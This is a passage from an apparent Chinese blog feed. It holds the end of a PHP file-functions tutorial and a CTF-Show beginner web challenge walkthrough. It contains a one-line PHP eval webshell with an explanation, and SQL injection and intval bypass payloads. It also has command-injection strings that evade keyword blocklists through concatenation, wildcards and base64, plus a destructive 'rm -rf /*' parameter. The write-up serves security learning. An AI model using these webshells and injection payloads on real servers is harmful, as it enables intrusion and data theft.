class="string">&quot;Ym&quot;</span>);</span><br><span class="line">    <span class="variable">$dir2</span> = date(<span class="string">&quot;d&quot;</span>);</span><br><span class="line">    <span class="variable">$fullPath</span> = <span class="variable">$path</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$dir1</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$dir2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建我们要上传的目录</span></span><br><span class="line">    <span class="keyword">if</span>(is_dir(<span class="variable">$fullPath</span>))&#123;</span><br><span class="line">        <span class="comment">//echo &quot;&quot;;</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        mkdir(<span class="variable">$fullPath</span>,<span class="number">0777</span>,<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="文件管理-函数"><a href="#文件管理-函数" class="headerlink" title="文件管理 函数"></a>文件管理 函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//echo realpath(&quot;.&quot;);//输出指定路径</span></span><br><span class="line">     </span><br><span class="line">    <span class="variable">$filename</span> = opendir(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = readdir(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$row</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">closedir(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_dir(<span class="string">&quot;../upload&quot;</span>))&#123; <span class="comment">//判断某 目录 是否存在</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&quot;1.php&quot;</span>); <span class="comment">//从指定文件读出内容</span></span><br><span class="line">    file_put_contents(<span class="string">&quot;111.txt&quot;</span>, <span class="string">&quot;123456&quot;</span>); <span class="comment">//在指定目录写入文件</span></span><br><span class="line"></span><br><span class="line">unlink(<span class="string">&quot;111.txt&quot;</span>);  <span class="comment">//删除指定文件</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>  输出指定目录下所有文件</span><br></pre></td></tr></table></figure><p>一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">示例：</span><br><span class="line"> <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line">解释：</span><br><span class="line"><span class="number">1</span>.<span class="meta">&lt;?php</span> <span class="meta">?&gt;</span>--php代码的标识，使服务器按照 php代码去解析</span><br><span class="line"><span class="number">2</span>.@--当执行错误的时候，不会报错</span><br><span class="line"><span class="number">3</span>.<span class="keyword">eval</span>()--把字符串作为 php代码去执行</span><br><span class="line"><span class="number">4</span>.<span class="variable">$_POST</span>--以POST方式获取 cmd参数</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="PHP" scheme="https://xizhi-future.github.io/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://xizhi-future.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CTF-Show-萌新计划</title>
    <link href="https://xizhi-future.github.io/2021/11/19/CTF-Show-%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92/"/>
    <id>https://xizhi-future.github.io/2021/11/19/CTF-Show-%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92/</id>
    <published>2021-11-19T07:17:08.000Z</published>
    <updated>2021-11-19T07:17:55.004Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="CTF-Show-—-萌新计划"><a href="#CTF-Show-—-萌新计划" class="headerlink" title="CTF Show — 萌新计划"></a>CTF Show — 萌新计划</h1><p>Web 1-7</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//<span class="built_in">echo</span> intval(<span class="string">&#x27;1000&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(intval(<span class="variable">$a</span>) &gt; 999 )&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进制转换</span></span><br><span class="line">0x38e<span class="comment">#十六进制</span></span><br><span class="line">0b1111101000<span class="comment"># 二进制</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 取反 异或 与运算</span></span><br><span class="line">~~1000</span><br><span class="line">200^800</span><br><span class="line">992|8</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 运算符</span></span><br><span class="line">200*5</span><br><span class="line">10/0.01</span><br><span class="line">--1000</span><br><span class="line">200%2b800</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sql 注入</span></span><br><span class="line">?id=1 or 1=1</span><br><span class="line">id=id<span class="comment">#</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=(1000)</span><br><span class="line">?id=<span class="string">&#x27;1000&#x27;</span></span><br><span class="line">?id=<span class="string">&quot;1000&quot;</span></span><br></pre></td></tr></table></figure><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web 1"></a>Web 1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># 包含数据库连接文件</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="comment"># 判断get提交的参数id是否存在</span></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="comment"># 判断id的值是否大于999</span></span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$id</span>) &gt; 999)&#123;</span><br><span class="line">        <span class="comment"># id 大于 999 直接退出并返回错误</span></span><br><span class="line">        die(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment"># id 小于 999 拼接sql语句</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from article where id = <span class="variable">$id</span> order by id limit 1 &quot;</span>;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;执行的sql为：<span class="variable">$sql</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="comment"># 执行sql 语句</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="comment"># 判断有没有查询结果</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">            <span class="comment"># 如果有结果，获取结果对象的值$row</span></span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc()) &#123;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;id: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>]. <span class="string">&quot; - title: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;title&quot;</span>]. <span class="string">&quot; &lt;br&gt;&lt;hr&gt;&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;content&quot;</span>]. <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># 关闭数据库连接</span></span><br><span class="line">        <span class="variable">$conn</span>-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- flag <span class="keyword">in</span> id = 1000 --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>需要满足 intval($id) &lt;= 999 , 但又要 id = 1000</p><p>测试</p><p><img src="https://i.loli.net/2021/08/16/au6swWVp8t4bKm5.png" alt="image-20210816155514366"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="string">&quot;1000&quot;</span></span><br><span class="line">?id=<span class="string">&#x27;1000&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/14/sLFV7bO5RuzCmXH.png" alt="image-20210814231236552"></p><p><strong>其它绕过方式：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=0x3e8  <span class="comment"># 数据库中查询可使用 十六进制</span></span><br><span class="line">select * from article <span class="built_in">where</span> id = 0x3e8 order by id <span class="built_in">limit</span> 1</span><br><span class="line"></span><br><span class="line">?id=125&lt;&lt;<span class="string">3# 不知</span></span><br><span class="line"><span class="string">?id=680|320# 不知</span></span><br></pre></td></tr></table></figure><h2 id="Web-2"><a href="#Web-2" class="headerlink" title="Web 2"></a>Web 2</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="string">&quot;1000&quot;</span></span><br><span class="line">?id=<span class="string">&#x27;1000&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Web-3"><a href="#Web-3" class="headerlink" title="Web 3"></a>Web 3</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="string">&quot;1000&quot;</span></span><br><span class="line">?id=<span class="string">&#x27;1000&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Web-4"><a href="#Web-4" class="headerlink" title="Web 4"></a>Web 4</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="string">&quot;1000&quot;</span></span><br><span class="line">?id=<span class="string">&#x27;1000&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Web-5"><a href="#Web-5" class="headerlink" title="Web 5"></a>Web 5</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\!|x|hex|\(|\)|\+|select/i&quot;</span>,<span class="variable">$id</span>))</span><br></pre></td></tr></table></figure><p>过滤引号</p><p><strong>取反绕过</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=~~1000</span><br></pre></td></tr></table></figure><p><strong>异或绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0^0 = 0</span><br><span class="line">1^0 = 1</span><br><span class="line">0^1 = 1</span><br><span class="line">1^1 = 0</span><br><span class="line">即同为假，异为真</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=</span><br></pre></td></tr></table></figure><p><strong>二进制绕过</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0b1111101000<span class="comment"># 0b 开头表示二进制</span></span><br></pre></td></tr></table></figure><h2 id="Web-6"><a href="#Web-6" class="headerlink" title="Web 6"></a>Web 6</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|x|hex|\(|\)|\+|select/i&quot;</span>,<span class="variable">$id</span>))</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0b1111101000<span class="comment"># 0b 开头表示二进制</span></span><br></pre></td></tr></table></figure><h2 id="Web-7"><a href="#Web-7" class="headerlink" title="Web 7"></a>Web 7</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|\~|x|hex|\(|\)|\+|select/i&quot;</span>,<span class="variable">$id</span>))</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0b1111101000<span class="comment"># 0b 开头表示二进制</span></span><br></pre></td></tr></table></figure><h2 id="Web-8-—-flag-rm-rf"><a href="#Web-8-—-flag-rm-rf" class="headerlink" title="Web 8 — ?flag=rm -rf /*"></a>Web 8 — ?flag=rm -rf /*</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># 包含数据库连接文件,key flag 也在里面定义</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="comment"># 判断get提交的参数id是否存在</span></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">                <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="variable">$f</span>)&#123;</span><br><span class="line">                        <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=rm -rf /*</span><br></pre></td></tr></table></figure><h2 id="Web-9"><a href="#Web-9" class="headerlink" title="Web 9"></a>Web 9</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/system|exec|highlight/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="built_in">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=highlight_file(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">?c=system(<span class="string">&#x27;cat config.php&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="Web-10"><a href="#Web-10" class="headerlink" title="Web 10"></a>Web 10</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="built_in">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=show_source(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">?c=<span class="variable">$a</span>=<span class="string">&#x27;sys&#x27;</span>;<span class="variable">$b</span>=<span class="string">&#x27;tem&#x27;</span>;<span class="variable">$d</span>=<span class="variable">$a</span>.<span class="variable">$b</span>;<span class="variable">$d</span>(<span class="string">&#x27;cat config.php&#x27;</span>);</span><br><span class="line">?c=passthru(<span class="string">&#x27;cat config.php&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="Web-11"><a href="#Web-11" class="headerlink" title="Web 11"></a>Web 11</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="built_in">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=show_source(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">?c=<span class="variable">$a</span>=<span class="string">&#x27;sys&#x27;</span>;<span class="variable">$b</span>=<span class="string">&#x27;tem&#x27;</span>;<span class="variable">$d</span>=<span class="variable">$a</span>.<span class="variable">$b</span>;<span class="variable">$d</span>(<span class="string">&#x27;tac config.php&#x27;</span>);</span><br><span class="line">?c=passthru(<span class="string">&#x27;tac config.php&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="Web-12"><a href="#Web-12" class="headerlink" title="Web 12"></a>Web 12</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat|\.|php|config/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="built_in">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?c=passthru(<span class="string">&#x27;tac confi*&#x27;</span>);</span><br><span class="line">?c=passthru(<span class="string">&#x27;tac con&quot;&quot;fig*&#x27;</span>);</span><br><span class="line">?c=passthru(<span class="string">&#x27;tac con\fig*&#x27;</span>);</span><br><span class="line">?c=<span class="variable">$a</span>=base64_decode(<span class="string">&quot;c3lzdGVt&quot;</span>);<span class="variable">$b</span>=base64_decode(<span class="string">&quot;Y2F0IGNvbmZpZy5waHA=&quot;</span>);<span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">#system(&#x27;cat config.php&#x27;);</span></span><br></pre></td></tr></table></figure><h2 id="Web-13-—-过滤-；"><a href="#Web-13-—-过滤-；" class="headerlink" title="Web 13 — 过滤 ；"></a>Web 13 — 过滤 ；</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat|\.|\;|file|php|config/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="built_in">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>过滤了 分号 ;</strong>    </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># include + 伪协议</span></span><br><span class="line">?c=include<span 